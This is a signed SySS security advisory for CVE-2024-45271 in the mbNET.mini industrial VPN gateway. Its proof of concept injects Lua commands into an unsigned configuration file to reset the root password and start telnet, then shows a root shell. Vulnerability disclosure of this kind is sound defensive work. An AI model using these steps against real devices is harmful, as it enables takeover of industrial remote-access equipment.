-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2024-059
Product: mbNET.mini
Manufacturer: Red Lion Europe GmbH
Affected Version(s): Firmware Versions: <= 2.2.13;
other/similar devices are also affected
(see manufacturer note[5])
Tested Version(s): Firmware Version: 2.2.13, 2.2.11
Vulnerability Type: Improper Input Validation (CWE-20)
Risk Level: High
Solution Status: Partly Fixed
Manufacturer Notification: 2024-07-25
Solution Date: 2024-09-25
Public Disclosure: 2024-10-15
CVE Reference: CVE-2024-45271
Author of Advisory: Moritz Abrell, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
The mbNET.mini is a VPN gateway used for remote access and maintenance
in industrial environments.
The manufacturer describes the product as follows (see [1]):
"The mbNET industrial router is the ideal basis for securely connecting
your machines and systems to the Internet - for direct access or via
our remote service portal (my)mbCONNECT24."
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The mbNET.mini can be configured by deploying a configuration file,
e.g., via a FAT-formatted USB drive and the exposed USB interface or
via the "Submit to Device" function (UDP upload).
Due to improper input validation and missing cryptographic signature
of the configuration file, a manipulated configuration leads to code
execution on the mbNET.mini.
Given that the task is executed with the highest system privileges,
the device can be fully compromised.
Moreover, neither deploying configuration files via USB nor uploading
configuration via the "Submit to Device" function (UDP) requires any
authentication.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
1. Download a valid configuration from the mbCONNECT24 portal.
2. Configuration file is a TAR archive:
$ file mbconnect24.mbn
mbconnect24.mbn: POSIX tar archive (GNU)
3. Extract the archive.
4. The file "runtime.rt" is a gzip-compressed TAR archive:
$ file runtime.rt
runtime.rt: gzip compressed data, from Unix, original size modulo 2^32 491520
5. Extract "runtime.rt", which contains several Lua scripts and program libraries.
6. Implement OS command exeuction in "main.lua":
[...]
function main(...)
[...]
\_execute("echo root:syss | chpasswd");
\_execute("telnetd&");
[...]
7. Compress and pack the configuration file as extracted (in reverse).
8. Use a FAT32-formatted USB drive to deploy the configuration according
to the documentation[4].
9. The main.lua script will be interpreted and the OS commands executed.
10. A telnet service will be launched on port 23.
11. Log in as root and set password via telnet:
$ telnet 192.168.0.100
Trying 192.168.0.100...
Connected to 192.168.0.100.
Escape character is '^]'.
Welcome to Freescale Semiconductor Embedded Linux Environment
mbNETmini login: root
Password:
BusyBox v1.23.1 () built-in shell (ash)
Enter 'help' for a list of built-in commands.
root@mbNETmini ~$ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
root@mbNETmini ~$
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Update the device according to the manufacturer note.[5]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2024-07-23: Vulnerability discovered
2024-07-25: Vulnerability reported to manufacturer
2024-07-25: Manufacturer confirmed reception
2024-07-31: Manufacturer asked for alternative publication date
2024-07-31: Asked the manufacturer for updates on the planned fixes
2024-08-02: Manufacturer responded that SYSS-2024-060 will not be fixed and
a new "encryption" concept will be implemented for SYSS-2024-059
2024-09-10: Update of the vulnerability state and the planned fixes by
the manufacturer
2024-09-20: CVE IDs assigned by the manufacturer
2024-09-24: Committment of the publication date (2024-10-15)
2024-10-15: Public disclosure
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] mbNET product website
https://mbconnectline.com/mbnet-en/
[2] SySS Security Advisory SYSS-2024-059
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-059.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy
[4] mbNET.mini manual
https://mbconnectline.com/download/manual-mbnet-mini-v2-2-11/
[5] Manufacturer note
https://advisories.mbconnectline.com/pdf/SIM2024-04.pdf
[6] CVE-2024-45271
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45271
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Moritz Abrell of SySS GmbH.
E-Mail: moritz.abrell@syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz\_Abrell.asc
Key Fingerprint: 2927 7EB6 1A20 0679 79E9 87E6 AE0C 9BF8 F134 8B53
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEEKSd+thogBnl56Yfmrgyb+PE0i1MFAmcGHZcACgkQrgyb+PE0
i1PcYQ//cPoCgFfnPVOWN4Q3RtlnOs8n32v8XRfjMxFwjGIXT/V0+31IQKZqMgm9
QoWxgWyCJZmI52r1OviPPazJGMIvZHIRkythraH/DSxbPH8apK3oKpwfkb0vbl05
oOzDSBqhFXSHG+L1sAFG/FQraViiYhPYhODMu+eI1/tdC+4W8JGccp5Vd52MHVXS
ws/KOFjChTnRJO2lPjOSxQUylPYzI9rN56/SCUggd55VOZdo+3ha9SRmMCBAzXNR
SGyP10PeBtgWbYYugeCYVRAgpGcBQNyY3wvOcOWOl8uz+gf8rtcKcZRExNrQxOC9
n0Ov3+qd5dWoWiIR7Ikj4xjJoIAR9qYu6qpKV9QIEfiazT7Vyab/Lg8AVKsD8gGT
D2pX+xhytCwOD/YHkafsGA6q4mQIvkEH5O501cn5khoED3aTcCySUt+E0Oh5IcKN
BqabCYyHdAzoTrZPrajkZhO7PxkH3twVq51I7W/7fu3Pb+gCBC6A01rpaND+gMDC
On0xB/Mxlu6WcnHk2jQubZ12ulm2Ctpu2g+GVyMQdLhtopvFPSKIByWEMslRlNIR
ZHOYQUY+uyPGWjWa8wKUGUBk9W7zANdJXBd+dIiSLcdim6ZYeWcW5HXKE+ivXR/+
NeCf8CedPzKADtqLqQnpNxdJ+fchDFSyDI7Y2//IksNRBdY9w6w=
=n8SC
-----END PGP SIGNATURE-----
